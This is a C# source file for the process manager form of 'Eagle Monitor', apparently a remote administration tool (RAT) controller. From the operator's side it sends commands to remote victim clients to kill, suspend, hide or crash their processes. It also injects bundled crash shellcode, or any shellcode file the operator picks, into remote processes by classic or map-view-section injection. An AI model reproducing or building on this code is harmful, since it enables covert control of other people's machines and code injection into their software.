using Eagle_Monitor.Clients;
using Eagle_Monitor.Controls;
using Shared;
using System;
using System.Drawing;
using System.Threading.Tasks;
using System.Windows.Forms;
using static Shared.Serializer;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor.Forms
{
    public partial class ProcessManagerForm : FormPattern
    {
        public string IP_Origin { get; set; }

        public ProcessManagerForm(string IP_Origin)
        {
            this.IP_Origin = IP_Origin;
            InitializeComponent();
        }

        private void ProcessManagerForm_Load(object sender, EventArgs e)
        {
            ControlsDrawing.Enable(processesListView);
            ControlsDrawing.Enable(processContextMenuStrip);

            foreach (ToolStripMenuItem I in processContextMenuStrip.Items)
            {
                I.BackColor = Color.White;
                I.ForeColor = Color.FromArgb(64, 64, 64);
            }
            processContextMenuStrip.Renderer = new ToolStripProfessionalRenderer(new ControlsDrawing.LightMenuColorTable());
        }

        private void closeButton_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void maximizeButton_Click(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Normal)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void minimizeButton_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client C = Client.ClientDictionary[this.IP_Origin];
            C.processManagerForm.loadingCircle1.Visible = true;
            C.processManagerForm.loadingCircle1.Active = true;
            C.processManagerForm.processesListView.Items.Clear();
            Data D = new Data();
            D.Type = Shared.PacketType.PLUGIN;
            D.Plugin = Plugins.ProcessManager;
            D.IP_Origin = C.IP;
            D.HWID = C.HWID;
            D.DataReturn = new object[] { Shared.PacketType.GET_PROC };
            Task.Run(() => C.SendData(D.Serialize()));
        }

        private void killToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if(processesListView.SelectedItems.Count == 1) 
            {
                Client C = Client.ClientDictionary[this.IP_Origin];
                Data D = new Data();
                D.Type = Shared.PacketType.PLUGIN;
                D.Plugin = Plugins.ProcessManager;
                D.IP_Origin = C.IP;
                D.HWID = C.HWID;
                D.DataReturn = new object[] { Shared.PacketType.KILL_PROC, processesListView.SelectedItems[0].SubItems[1].Text };
                Task.Run(() => C.SendData(D.Serialize()));
            }
        }

        private void suspendToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (processesListView.SelectedItems.Count == 1)
            {
                Client C = Client.ClientDictionary[this.IP_Origin];
                Data D = new Data();
                D.Type = Shared.PacketType.PLUGIN;
                D.Plugin = Plugins.ProcessManager;
                D.IP_Origin = C.IP;
                D.HWID = C.HWID;
                D.DataReturn = new object[] { Shared.PacketType.SUSPEND_PROC, processesListView.SelectedItems[0].SubItems[1].Text };
                Task.Run(() => C.SendData(D.Serialize()));
            }
        }

        private void resumeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (processesListView.SelectedItems.Count == 1)
            {
                Client C = Client.ClientDictionary[this.IP_Origin];
                Data D = new Data();
                D.Type = Shared.PacketType.PLUGIN;
                D.Plugin = Plugins.ProcessManager;
                D.IP_Origin = C.IP;
                D.HWID = C.HWID;
                D.DataReturn = new object[] { Shared.PacketType.RESUME_PROC, processesListView.SelectedItems[0].SubItems[1].Text };
                Task.Run(() => C.SendData(D.Serialize()));
            }
        }

        private void setWindowsTextToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (processesListView.SelectedItems.Count == 1)
            {
                Client C = Client.ClientDictionary[this.IP_Origin];
                Data D = new Data();
                D.Type = Shared.PacketType.PLUGIN;
                D.Plugin = Plugins.ProcessManager;
                D.IP_Origin = C.IP;
                D.HWID = C.HWID;
                string text = Microsoft.VisualBasic.Interaction.InputBox("New title : ");
                D.DataReturn = new object[] { Shared.PacketType.SET_WND_TEXT, processesListView.SelectedItems[0].SubItems[1].Text, text };
                Task.Run(() => C.SendData(D.Serialize()));
            }
        }

        private void minimizeWindowToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (processesListView.SelectedItems.Count == 1)
            {
                Client C = Client.ClientDictionary[this.IP_Origin];
                Data D = new Data();
                D.Type = Shared.PacketType.PLUGIN;
                D.Plugin = Plugins.ProcessManager;
                D.IP_Origin = C.IP;
                D.HWID = C.HWID;
                D.DataReturn = new object[] { Shared.PacketType.MINIMZE_WND, processesListView.SelectedItems[0].SubItems[1].Text};
                Task.Run(() => C.SendData(D.Serialize()));
            }
        }

        private void maximizeWindowToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (processesListView.SelectedItems.Count == 1)
            {
                Client C = Client.ClientDictionary[this.IP_Origin];
                Data D = new Data();
                D.Type = Shared.PacketType.PLUGIN;
                D.Plugin = Plugins.ProcessManager;
                D.IP_Origin = C.IP;
                D.HWID = C.HWID;
                D.DataReturn = new object[] { Shared.PacketType.MAXIMIZE_WND, processesListView.SelectedItems[0].SubItems[1].Text };
                Task.Run(() => C.SendData(D.Serialize()));
            }
        }

        private void hideWindowToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (processesListView.SelectedItems.Count == 1 && processesListView.SelectedItems[0].SubItems[3].Text != "0")
            {
                Client C = Client.ClientDictionary[this.IP_Origin];
                Data D = new Data();
                D.Type = Shared.PacketType.PLUGIN;
                D.Plugin = Plugins.ProcessManager;
                D.IP_Origin = C.IP;
                D.HWID = C.HWID;
                D.DataReturn = new object[] { Shared.PacketType.HIDE_WND, new IntPtr(int.Parse(processesListView.SelectedItems[0].SubItems[3].Text)) };
                Task.Run(() => C.SendData(D.Serialize()));
            }
        }

        private void showWindowToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (processesListView.SelectedItems.Count == 1 && processesListView.SelectedItems[0].SubItems[3].Text != "0")
            {
                Client C = Client.ClientDictionary[this.IP_Origin];
                Data D = new Data();
                D.Type = Shared.PacketType.PLUGIN;
                D.Plugin = Plugins.ProcessManager;
                D.IP_Origin = C.IP;
                D.HWID = C.HWID;
                D.DataReturn = new object[] { Shared.PacketType.SHOW_WND, new IntPtr(int.Parse(processesListView.SelectedItems[0].SubItems[3].Text)) };
                Task.Run(() => C.SendData(D.Serialize()));
            }
        }

        private void crashProcessToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (processesListView.SelectedItems.Count == 1 && processesListView.SelectedItems[0].SubItems[4].Text == "64") 
            {
                byte[] shellcode = ShellCodePlugins.ProcessCrash_64;

                Client C = Client.ClientDictionary[this.IP_Origin];
                Data D = new Data();
                D.Type = Shared.PacketType.PLUGIN;
                D.Plugin = Plugins.ProcessManager;
                D.IP_Origin = C.IP;
                D.HWID = C.HWID;
                D.DataReturn = new object[] { Shared.PacketType.INJECT_CLASSIC_METHOD, processesListView.SelectedItems[0].SubItems[1].Text, shellcode };
                Task.Run(() => C.SendData(D.Serialize()));
            }

            if (processesListView.SelectedItems.Count == 1 && processesListView.SelectedItems[0].SubItems[4].Text == "32")
            {
                byte[] shellcode = ShellCodePlugins.ProcessCrash_32;

                Client C = Client.ClientDictionary[this.IP_Origin];
                Data D = new Data();
                D.Type = Shared.PacketType.PLUGIN;
                D.Plugin = Plugins.ProcessManager;
                D.IP_Origin = C.IP;
                D.HWID = C.HWID;
                D.DataReturn = new object[] { Shared.PacketType.INJECT_CLASSIC_METHOD, processesListView.SelectedItems[0].SubItems[1].Text, shellcode };
                Task.Run(() => C.SendData(D.Serialize()));
            }
        }

        private void classicMethodToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog o = new OpenFileDialog())
            {
                if (o.ShowDialog() == DialogResult.OK)
                {
                    byte[] shellcode = Compressor.QuickLZ.Compress(System.IO.File.ReadAllBytes(o.FileName), 1);

                    Client C = Client.ClientDictionary[this.IP_Origin];
                    Data D = new Data();
                    D.Type = Shared.PacketType.PLUGIN;
                    D.Plugin = Plugins.ProcessManager;
                    D.IP_Origin = C.IP;
                    D.HWID = C.HWID;
                    D.DataReturn = new object[] { Shared.PacketType.INJECT_CLASSIC_METHOD, processesListView.SelectedItems[0].SubItems[1].Text, shellcode };
                    Task.Run(() => C.SendData(D.Serialize()));
                }
            }
        }

        private void mapViewToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog o = new OpenFileDialog())
            {
                if (o.ShowDialog() == DialogResult.OK)
                {
                    byte[] shellcode = Compressor.QuickLZ.Compress(System.IO.File.ReadAllBytes(o.FileName), 1);

                    Client C = Client.ClientDictionary[this.IP_Origin];
                    Data D = new Data();
                    D.Type = Shared.PacketType.PLUGIN;
                    D.Plugin = Plugins.ProcessManager;
                    D.IP_Origin = C.IP;
                    D.HWID = C.HWID;
                    D.DataReturn = new object[] { Shared.PacketType.INJECT_MAP_VIEW_SECTION, processesListView.SelectedItems[0].SubItems[1].Text, shellcode };
                    Task.Run(() => C.SendData(D.Serialize()));
                }
            }
        }
    }
}
